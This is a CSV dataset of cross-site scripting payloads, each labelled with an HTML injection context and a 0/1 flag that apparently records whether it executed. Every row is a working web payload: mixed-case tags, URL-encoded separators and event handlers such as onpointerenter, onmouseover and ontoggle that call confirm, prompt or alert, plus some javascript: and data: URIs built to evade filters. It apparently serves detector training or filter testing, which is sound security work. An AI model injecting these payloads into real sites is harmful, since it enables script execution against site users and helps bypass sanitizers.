payload,context,exec,combined
<HtMl/+/onpOINTERenTER%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <HtMl/+/onpOINTERenTER%09=%09[8].find(confirm)%0dx//
<DeTails/+/OnTOggLE%0a=%0a[8].find(confirm)>,html_text,0,CONTEXT_html_text <DeTails/+/OnTOggLE%0a=%0a[8].find(confirm)>
<A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<detAIls%0donpOInterENteR%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <detAIls%0donpOInterENteR%0d=%0da=prompt,a()//"
<detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//,html_text,0,CONTEXT_html_text <detAiLS%0doNPoinTeReNtER%0d=%0d(confirm)()%0dx//
<A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s
"<DeTAILS%09oNpointErEntEr+=+a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DeTAILS%09oNpointErEntEr+=+a=prompt,a()//"
<svg><script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(1)</script>
<deTAiLS%0donpOINTERENTEr%09=%09[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <deTAiLS%0donpOINTERENTEr%09=%09[8].find(confirm)>
<D3V/+/onpoiNteRENteR%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onpoiNteRENteR%0d=%0dconfirm()>v3dm0s
<HtMl%09OnPOiNtERENtER%0a=%0a(prompt)``>,html_text,0,CONTEXT_html_text <HtMl%09OnPOiNtERENtER%0a=%0a(prompt)``>
"<DEtailS%0doNToGGLe%0a=%0aa=prompt,a()>",html_text,0,"CONTEXT_html_text <DEtailS%0doNToGGLe%0a=%0aa=prompt,a()>"
<D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s
<htMl%09oNMOuSeOVeR%09=%09(confirm)()//,html_tag,0,CONTEXT_html_tag <htMl%09oNMOuSeOVeR%09=%09(confirm)()//
<A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s
<dETails%09OntOgGLE%0a=%0a(confirm)()>,html_text,0,CONTEXT_html_text <dETails%09OntOgGLE%0a=%0a(confirm)()>
<dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//
"<htmL%09OnpoINterENter%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <htmL%09OnpoINterENter%0a=%0aa=prompt,a()%0dx>"
<A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s
<a%0aONpOInTEREnTER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONpOInTEREnTER%0a=%0aconfirm()>v3dm0s
<htmL%09OnmouSeoVeR%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <htmL%09OnmouSeoVeR%0a=%0aconfirm()>
<d3V%0donPOiNtErENteR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donPOiNtErENteR%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<details/+/ONpOinteRENTeR+=+a=prompt,a()//",html_text,0,"CONTEXT_html_text <details/+/ONpOinteRENTeR+=+a=prompt,a()//"
<D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s
<HtmL/+/ONMoUseOVer%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <HtmL/+/ONMoUseOVer%09=%09confirm()%0dx>
<d3v%0aoNPOiNteRENTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aoNPOiNteRENTeR%09=%09(prompt)``>v3dm0s
<a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s
<d3v/+/oNpoinTereNTeR+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v/+/oNpoinTereNTeR+=+[8].find(confirm)>v3dm0s
<d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/oNPOiNtERenTeR%0d=%0d(confirm)()%0dx>v3dm0s
<a%09oNmOuseover+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%09oNmOuseover+=+confirm()%0dx>v3dm0s
<dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>
<a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s
<details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag <details open ontoggle=alert(1)>
<Details/+/onPOINTeRenTeR%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <Details/+/onPOINTeRenTeR%09=%09confirm()//
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
<a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s
"<hTml%0donMouseOVer+=+a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <hTml%0donMouseOVer+=+a=prompt,a()//"
<a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s
<dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>
<D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s
"<d3V%09OnpOinTErEntER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%09OnpOinTErEntER%0d=%0da=prompt,a()%0dx>v3dm0s"
</textarea><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </textarea><svg/onload=alert(1)>
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
<html%0aoNpoiNtereNTer+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <html%0aoNpoiNtereNTer+=+[8].find(confirm)%0dx>
"<HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>"
<DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//
<DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>
<a%0aONPointerEnTeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONPointerEnTeR%09=%09(prompt)``%0dx>v3dm0s
<detAils%0doNtoGGLE%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <detAils%0doNtoGGLE%0a=%0a[8].find(confirm)%0dx//
<d3V/+/ONPOiNteReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/ONPOiNteReNTER%0d=%0d(prompt)``%0dx>v3dm0s
"<A%0donPoInTErENtEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0donPoInTErENtEr%0d=%0da=prompt,a()>v3dm0s"
<D3v%09oNmoUseOVER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09oNmoUseOVER%0a=%0aconfirm()%0dx>v3dm0s
<A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s
<Html%0dOnMOUSeOVEr+=+confirm()>,html_tag,0,CONTEXT_html_tag <Html%0dOnMOUSeOVEr+=+confirm()>
<A/+/oNPoIntEreNTER%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNPoIntEreNTER%0a=%0a(prompt)``>v3dm0s
<hTml%0dONPOinterEntER+=+[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <hTml%0dONPOinterEntER+=+[8].find(confirm)%0dx//
<a%09OnpOiNtereNTeR%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnpOiNtereNTeR%0d=%0d[8].find(confirm)>v3dm0s
javascript:alert(String.fromCharCode(49)),url_href,1,CONTEXT_url_href javascript:alert(String.fromCharCode(49))
<dEtaIlS%09ONtoggLE+=+(confirm)()//,html_text,0,CONTEXT_html_text <dEtaIlS%09ONtoggLE+=+(confirm)()//
<deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//
<A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s
<HTMl%0aONpOINTeRenTer%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HTMl%0aONpOINTeRenTer%09=%09(confirm)()%0dx//
<HtmL%09OnpointerENTeR%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <HtmL%09OnpointerENTeR%09=%09confirm()//
"<A%0doNmOuSEOVER%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0doNmOuSEOVER%0d=%0da=prompt,a()%0dx>v3dm0s"
<HTmL%0aOnpOiNtEREnter%0d=%0d(confirm)()//,html_text,0,CONTEXT_html_text <HTmL%0aOnpOiNtEREnter%0d=%0d(confirm)()//
<D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/ONPoInteRenTer%0a=%0aconfirm()%0dx>v3dm0s
<A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s
<Html%09OnmOUSEOVeR%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <Html%09OnmOUSEOVeR%09=%09(prompt)``%0dx>
<hTML%0aonpOInTeRenter%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <hTML%0aonpOInTeRenter%0d=%0dconfirm()%0dx>
<a%0aoNPOinTErEnTeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNPOinTErEnTeR%0a=%0aconfirm()%0dx>v3dm0s
<DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//
<a%0aONMoUseoVEr%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONMoUseoVEr%09=%09confirm()>v3dm0s
"<d3v%09ONpOInTErenter+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v%09ONpOInTErenter+=+a=prompt,a()>v3dm0s"
<detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//,html_text,0,CONTEXT_html_text <detAILS%09oNpOinTerenTER%0d=%0d[8].find(confirm)//
"<D3v%0dOnMOusEOvEr+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <D3v%0dOnMOusEOvEr+=+a=prompt,a()%0dx>v3dm0s"
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1,CONTEXT_html_tag </pre><marquee onmouseover=alert(1)>hover me</marquee
"<hTMl%0dOnPoINTeRentEr%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <hTMl%0dOnPoINTeRentEr%09=%09a=prompt,a()>"
"<a%0doNPOINTeReNter%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0doNPOINTeReNter%09=%09a=prompt,a()%0dx>v3dm0s"
<d3v/+/ONPoiNTerenTer%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/ONPoiNTerenTer%09=%09(prompt)``>v3dm0s
<DEtAiLs%09ONtOGGLE%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DEtAiLs%09ONtOGGLE%0a=%0a(confirm)()%0dx//
"<Html%0dONmOUSEOVer+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <Html%0dONmOUSEOVer+=+a=prompt,a()%0dx//"
"<hTMl%0aoNpOINterENter%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <hTMl%0aoNpOINterENter%0a=%0aa=prompt,a()//"
<dEtaiLs/+/onpOiNTeREnTER+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <dEtaiLs/+/onpOiNTeREnTER+=+[8].find(confirm)//
<deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>,html_text,0,CONTEXT_html_text <deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>
<D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s
<D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s
<A%0aonMOUsEOveR+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aonMOUsEOveR+=+(prompt)``>v3dm0s
<A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s
<DetAils%0aOnTOGGLE%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <DetAils%0aOnTOGGLE%09=%09confirm()>
"<DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//"
"<DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//"
</pre><details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><details open ontoggle=alert(1)>
<D3v%09onPoiNtereNtEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onPoiNtereNtEr%0a=%0aconfirm()>v3dm0s
"<A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s"
<dETAILs/+/onTogGLE%09=%09(prompt)``>,html_tag,0,CONTEXT_html_tag <dETAILs/+/onTogGLE%09=%09(prompt)``>
<a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s
<htmL%0donPOinteRENter%0a=%0a(prompt)``>,html_text,0,CONTEXT_html_text <htmL%0donPOinteRENter%0a=%0a(prompt)``>
<d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s
<A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s
<dEtAiLs%0aonPOINteREnTeR%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <dEtAiLs%0aonPOINteREnTeR%09=%09confirm()//
<HtmL/+/ONMOusEOVer%0a=%0a[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <HtmL/+/ONMOusEOVer%0a=%0a[8].find(confirm)%0dx>
<D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s
<A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s
<html%0dONpointERenter+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <html%0dONpointERenter+=+[8].find(confirm)>
<dEtailS%09ONtOGGle%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <dEtailS%09ONtOGGle%09=%09[8].find(confirm)%0dx//
<d3V/+/onMOuSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onMOuSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<hTml/+/ONMouseOVeR+=+(confirm)()//,html_text,0,CONTEXT_html_text <hTml/+/ONMouseOVeR+=+(confirm)()//
<Html/+/oNPoinTERENteR%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <Html/+/oNPoinTERENteR%0d=%0d(confirm)()%0dx>
<detaIlS/+/ontoGGle+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <detaIlS/+/ontoGGle+=+[8].find(confirm)>
<D3v%09ONPoIntereNTER+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%09ONPoIntereNTER+=+(confirm)()%0dx>v3dm0s
javascript:prompt`1`,url_href,1,CONTEXT_url_href javascript:prompt`1`
<htmL%0doNmOUseOVEr+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <htmL%0doNmOUseOVEr+=+(confirm)()%0dx//
"data:text/html,<svg/onload=alert(1)>",html_tag,0,"CONTEXT_html_tag data:text/html,<svg/onload=alert(1)>"
"<A%0doNpointereNTER+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <A%0doNpointereNTER+=+a=prompt,a()>v3dm0s"
<d3v/+/ONPoiNTerenTer%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/ONPoiNTerenTer%09=%09(prompt)``>v3dm0s
<dETaILS%09oNtOgGLE+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <dETaILS%09oNtOgGLE+=+(prompt)``%0dx//
<D3v%0aonpOInTeRentEr+=+confirm()%0dx>v3dm0s,html_attribute,0,CONTEXT_html_attribute <D3v%0aonpOInTeRentEr+=+confirm()%0dx>v3dm0s
<D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s
<d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s
<D3V%09oNMouSeover%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09oNMouSeover%09=%09confirm()%0dx>v3dm0s
<HTML%0dONPOinterenTeR+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <HTML%0dONPOinterenTeR+=+confirm()%0dx//
<hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>
"<a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s"
<a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s
<dETaIls%0aoNToggLe%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <dETaIls%0aoNToggLe%0d=%0dconfirm()>
<a%09ONpOINTerENTer%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONpOINTerENTer%09=%09(confirm)()>v3dm0s
<DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>
<d3V%0aONPoINTeREnteR+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3V%0aONPoINTeREnteR+=+(confirm)()%0dx>v3dm0s
<d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<A%09ONpoInteReNTER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONpoInteReNTER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<dEtaIls%09ONpOiNTEREntEr%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <dEtaIls%09ONpOiNTEREntEr%09=%09confirm()%0dx//
"<DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//"
<D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s
<deTAIlS%09ONTOggle+=+(prompt)``%0dx>,html_text,0,CONTEXT_html_text <deTAIlS%09ONTOggle+=+(prompt)``%0dx>
<a%0dOnPoINTerenTer%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnPoINTerenTer%0a=%0a(prompt)``>v3dm0s
<d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s
<D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s
"<A/+/onPOINtErENtEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A/+/onPOINtErENtEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>
<htML/+/oNmOuSeoVEr+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <htML/+/oNmOuSeoVEr+=+confirm()%0dx>
<d3v/+/onmousEoVER%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/onmousEoVER%09=%09(confirm)()%0dx>v3dm0s
"<dETAils%0aOnpoInTeRenTer+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <dETAils%0aOnpoInTeRenTer+=+a=prompt,a()%0dx>"
<A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s
<A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s
<HtMl/+/oNPointeReNTER%0d=%0d(prompt)``//,html_tag,0,CONTEXT_html_tag <HtMl/+/oNPointeReNTER%0d=%0d(prompt)``//
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
"<A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s"
<htMl%0aONmOUSeOVEr%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <htMl%0aONmOUSeOVEr%0d=%0dconfirm()%0dx>
<hTMl%09oNmOUsEoVer%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <hTMl%09oNmOUsEoVer%0a=%0a(prompt)``>
<hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//
<A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s
<D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s
<A%0dONPOinTErEnTer+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dONPOinTErEnTer+=+(prompt)``>v3dm0s
<hTml%0aOnPointERENtEr%0d=%0dconfirm()//,html_tag,0,CONTEXT_html_tag <hTml%0aOnPointERENtEr%0d=%0dconfirm()//
<html%0aoNmoUSeOVer%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <html%0aoNmoUSeOVer%0a=%0aconfirm()//
<A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A/+/onMOusEOVEr+=+(prompt)``%0dx>v3dm0s
<a/+/ONmouSeover+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <a/+/ONmouSeover+=+(confirm)()>v3dm0s
"<a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <a%0aOnPoIntERENTER+=+a=prompt,a()>v3dm0s"
"<D3V%09OnmouSEOVER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%09OnmouSEOVER%0d=%0da=prompt,a()>v3dm0s"
